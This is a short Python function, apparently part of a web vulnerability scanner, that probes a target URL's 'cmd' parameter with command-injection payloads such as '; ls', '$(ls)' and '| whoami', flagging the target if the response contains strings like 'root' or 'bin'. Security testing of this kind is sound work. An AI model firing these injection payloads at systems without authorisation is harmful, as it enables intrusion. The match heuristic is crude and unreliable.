import requests
from colorama import Fore, Style, init
import subprocess
import platform

init(autoreset=True)

def cmd_injection_scan(target, verbose=False):
    print(Fore.CYAN + "[COMMAND INJECTION SCAN STARTED]")
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    payloads = [
        "; ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "; whoami",
        "| whoami"
    ]

    vuln_found = False

    for payload in payloads:
        try:
            url = f"{target.rstrip('/')}?cmd={payload}"
            response = session.get(url, timeout=5)
            if "bin" in response.text or "root" in response.text or "directory" in response.text:
                print(Fore.RED + f"[CMD INJ VULN] {url}")
                vuln_found = True
        except Exception as e:
            if verbose:
                print(Fore.YELLOW + f"[INFO] {url} - {e}")

    if not vuln_found:
        print(Fore.GREEN + "[CMD INJ] No vulnerabilities found")
    print(Fore.CYAN + "[COMMAND INJECTION SCAN COMPLETED]")